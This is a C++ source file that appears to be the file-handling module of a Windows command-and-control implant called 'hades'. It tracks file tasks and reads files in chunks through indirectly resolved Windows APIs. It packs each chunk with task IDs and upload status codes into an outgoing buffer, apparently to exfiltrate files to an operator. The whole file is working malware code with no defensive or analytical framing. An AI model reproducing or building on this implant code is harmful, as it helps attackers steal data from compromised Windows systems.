#include "files.hpp"
#include "../hades/hades.h"
#include "../utils/bytes.hpp"
#include <stdio.h>

BOOL FileMgr::InsertTask(UINT32 TaskID, HANDLE handle, TaskType type) {
    for (Node<FileTasks>* cur = Tasks.Head(); cur; cur = cur->next) {
        if (cur->data.TaskID == TaskID) {
            return FALSE;
        }
    }
    FileTasks task = {};
    task.hProc = handle;
    task.TaskID = TaskID;
    task.Status = FileOnGoing;
    task.type = type;
    return Tasks.Add(task) != NULL;

}


BOOL FileMgr::ProcessEntry(FileTasks* task) {
    if (!task) {
        return TRUE;
    }


    if (task->Status == FileDone || task->Status == FileFail ||
        !task->hProc || task->hProc == INVALID_HANDLE_VALUE) {
        return TRUE;
    }

    DWORD BytesRead = 0;
    PBYTE buf = AllocMemory<BYTE>(FILE_CHUNK_SIZE);

    if (!hades->WinApis.ReadFile(task->hProc, buf, FILE_CHUNK_SIZE, &BytesRead, NULL)) {
        DWORD err = GetTeb()->LastErrorValue;
        task->Status = FileFail;

        g_ByteMgr->Write4(task->TaskID);
        g_ByteMgr->EndErr(err);

        HeapFree(GetProcessHeap(), 0, buf);
        return TRUE;
    }

    if (BytesRead == 0) {
        task->Status = FileDone;

        HeapFree(GetProcessHeap(), 0, buf);
        return TRUE;
    }

    g_ByteMgr->Write4(task->TaskID);
    g_ByteMgr->Write4(STATUS_OK);
    g_ByteMgr->Write4(TASK_TYPE_UPLOAD);

    if (BytesRead < FILE_CHUNK_SIZE) {
        g_ByteMgr->Write4(UPLOAD_DONE);
        task->Status = FileDone;
    }
    else {
        g_ByteMgr->Write4(UPLOAD_CHUNKED);
    }

    g_ByteMgr->Write4(BytesRead);
    g_ByteMgr->WriteString(buf, BytesRead);

    HeapFree(GetProcessHeap(), 0, buf);

    return task->Status == FileDone;
}


HANDLE FileMgr::GetHandle(UINT32 TaskID) {
    for (Node<FileTasks>* cur = Tasks.Head(); cur; cur = cur->next) {
        if (cur->data.TaskID == TaskID) {
            return cur->data.hProc;
        }
    }
    return INVALID_HANDLE_VALUE;
}


BOOL FileMgr::RemoveTask(UINT32 TaskID) {

    Node<FileTasks>* prev = NULL;
    for (Node<FileTasks>* cur = Tasks.Head(); cur; cur = cur->next) {
        if (cur->data.TaskID == TaskID) {
            Tasks.Remove(prev, cur);
            return TRUE;
        }
        prev = cur;
    }
    return FALSE;
}


BOOL FileMgr::CheckTasks() {

    Node<FileTasks>* prev = NULL;
    Node<FileTasks>* cur = Tasks.Head();

    while (cur) {
        Node<FileTasks>* next = cur->next;
        BOOL remove = (cur->data.type == FileUpload) ? FALSE : this->ProcessEntry(&cur->data);

        if (remove) {
            if (cur->data.hProc && cur->data.hProc != INVALID_HANDLE_VALUE) {
                hades->WinApis.CloseHandle(cur->data.hProc);
            }
            Tasks.Remove(prev, cur);
        }
        else {
            prev = cur;
        }

        cur = next;

    }

    return TRUE;
}

FileMgr* g_FileMgr = NULL;
